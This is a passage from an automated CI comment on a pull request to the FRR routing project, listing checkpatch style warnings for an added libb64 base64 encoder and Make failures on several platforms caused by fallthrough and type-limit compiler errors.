line\n    #20: FILE: /tmp/f1-18189/base64.c:20:\n    +\tif (value_in > 63) return '=';\n    \n    WARNING: line over 80 characters\n    #24: FILE: /tmp/f1-18189/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-18189/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-18189/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-18189/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-18189/base64.c:26:\n    +\tconst char* plainchar = plaintext_in;\n    \n    ERROR: \"foo* const bar\" should be \"foo * const bar\"\n    #27: FILE: /tmp/f1-18189/base64.c:27:\n    +\tconst char* const plaintextend = plaintext_in + length_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-18189/base64.c:28:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #34: FILE: /tmp/f1-18189/base64.c:34:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #36: FILE: /tmp/f1-18189/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #36: FILE: /tmp/f1-18189/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #39: FILE: /tmp/f1-18189/base64.c:39:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #50: FILE: /tmp/f1-18189/base64.c:50:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #61: FILE: /tmp/f1-18189/base64.c:61:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #74: FILE: /tmp/f1-18189/base64.c:74:\n    +\t\t\tif (state_in->stepcount == CHARS_PER_LINE/4)\n    +\t\t\t{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #85: FILE: /tmp/f1-18189/base64.c:85:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #85: FILE: /tmp/f1-18189/base64.c:85:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-18189/base64.c:87:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #89: FILE: /tmp/f1-18189/base64.c:89:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #112: FILE: /tmp/f1-18189/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #112: FILE: /tmp/f1-18189/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #112: FILE: /tmp/f1-18189/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #112: FILE: /tmp/f1-18189/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #112: FILE: /tmp/f1-18189/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #112: FILE: /tmp/f1-18189/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #112: FILE: /tmp/f1-18189/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #112: FILE: /tmp/f1-18189/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #112: FILE: /tmp/f1-18189/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #112: FILE: /tmp/f1-18189/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-18189/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-18189/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-18189/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-18189/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-18189/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-18189/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #113: FILE: /tmp/f1-18189/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                    ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #113: FILE: /tmp/f1-18189/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                     ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-18189/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                   ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-18189/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-18189/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-18189/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-18189/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t          ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-18189/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-18189/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-18189/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-18189/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-18189/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-18189/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-18189/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-18189/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-18189/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-18189/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-18189/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-18189/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-18189/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-18189/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-18189/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-18189/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-18189/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-18189/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-18189/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-18189/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-18189/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-18189/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-18189/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-18189/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-18189/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-18189/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-18189/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-18189/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-18189/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-18189/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-18189/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-18189/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-18189/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-18189/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-18189/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-18189/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-18189/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-18189/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                    ^\n    \n    WARNING: Missing a blank line after declarations\n    #124: FILE: /tmp/f1-18189/base64.c:124:\n    +\tstatic const char decoding_size = sizeof(decoding);\n    +\tvalue_in -= 43;\n    \n    ERROR: trailing statements should be on next line\n    #125: FILE: /tmp/f1-18189/base64.c:125:\n    +\tif (value_in < 0 || value_in >= decoding_size) return -1;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #129: FILE: /tmp/f1-18189/base64.c:129:\n    +void base64_init_decodestate(base64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #135: FILE: /tmp/f1-18189/base64.c:135:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #135: FILE: /tmp/f1-18189/base64.c:135:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #136: FILE: /tmp/f1-18189/base64.c:136:\n    +\t\t\tbase64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #138: FILE: /tmp/f1-18189/base64.c:138:\n    +\tconst char* codechar = code_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #139: FILE: /tmp/f1-18189/base64.c:139:\n    +\tchar* plainchar = plaintext_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #144: FILE: /tmp/f1-18189/base64.c:144:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #146: FILE: /tmp/f1-18189/base64.c:146:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #146: FILE: /tmp/f1-18189/base64.c:146:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #150: FILE: /tmp/f1-18189/base64.c:150:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #156: FILE: /tmp/f1-18189/base64.c:156:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    \n    ERROR: that open brace { should be on the previous line\n    #161: FILE: /tmp/f1-18189/base64.c:161:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #167: FILE: /tmp/f1-18189/base64.c:167:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    \n    ERROR: that open brace { should be on the previous line\n    #173: FILE: /tmp/f1-18189/base64.c:173:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #179: FILE: /tmp/f1-18189/base64.c:179:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    \n    ERROR: that open brace { should be on the previous line\n    #185: FILE: /tmp/f1-18189/base64.c:185:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #191: FILE: /tmp/f1-18189/base64.c:191:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    Report for base64.h | 85 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-18189/base64.h:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    WARNING: do not add new typedefs\n    #9: FILE: /tmp/f1-18189/base64.h:9:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #10: FILE: /tmp/f1-18189/base64.h:10:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #14: FILE: /tmp/f1-18189/base64.h:14:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #15: FILE: /tmp/f1-18189/base64.h:15:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #21: FILE: /tmp/f1-18189/base64.h:21:\n    +void base64_init_encodestate(base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-18189/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-18189/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-18189/base64.h:26:\n    +\t\t\tbase64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-18189/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-18189/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    WARNING: do not add new typedefs\n    #31: FILE: /tmp/f1-18189/base64.h:31:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #32: FILE: /tmp/f1-18189/base64.h:32:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #36: FILE: /tmp/f1-18189/base64.h:36:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #37: FILE: /tmp/f1-18189/base64.h:37:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #42: FILE: /tmp/f1-18189/base64.h:42:\n    +void base64_init_decodestate(base64_decodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-18189/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-18189/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #47: FILE: /tmp/f1-18189/base64.h:47:\n    +\t\t\tbase64_decodestate* state_in);\n    \n    WARNING: C99 // comments do not match recommendation\n    #49: FILE: /tmp/f1-18189/base64.h:49:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 8 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-18189/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #691: FILE: /tmp/f1-18189/yang_wrappers.c:691:\n    < WARNING: Missing a blank line after declarations\n    < #696: FILE: /tmp/f1-18189/yang_wrappers.c:696:\n    < WARNING: Missing a blank line after declarations\n    < #709: FILE: /tmp/f1-18189/yang_wrappers.c:709:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Failed\n<details>\n<summary>Debian 10 amd64 build: Failed (click for details)</summary>\nDebian 10 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB10BUILD/config.log/config.log.gz\n\n__Make failed for Debian 10 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB10BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nDebian 10 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB10BUILD/config.status/config.status\n</details>\n<details>\n<summary>FreeBSD 11 amd64 build: Failed (click for details)</summary>\n\n__Make failed for FreeBSD 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI009BUILD/ErrorLog/log_make.txt)\n\n    /usr/home/ci/cibuild.3562/frr-source/doc/user/zebra.rst:1380: WARNING: duplicate clicmd description of debug zebra pbr, other instance in pbr\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFreeBSD 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI009BUILD/config.status/config.status\nFreeBSD 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI009BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI101BUILD/config.status/config.status\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI101BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 16.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI101BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 16.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U16ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as 